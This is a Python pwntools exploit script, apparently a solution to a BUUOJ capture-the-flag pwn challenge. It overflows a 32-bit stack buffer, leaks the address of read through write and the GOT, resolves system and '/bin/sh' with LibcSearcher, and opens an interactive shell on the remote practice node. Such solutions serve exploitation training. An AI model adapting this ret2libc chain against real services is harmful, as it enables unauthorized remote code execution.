from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 26702)
elf = ELF('./pwn')

payload = cyclic(136 + 4)
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['vulnerable_function'])
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(4)

io.sendline(payload)

read = u32(io.recv(4))
print(hex(read))
libc = LibcSearcher('read', read)
base = read - libc.dump('read')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(136 + 4)
payload += p32(sys)
payload += p32(0xdeadbeef)
payload += p32(binsh)

io.sendline(payload)

io.interactive()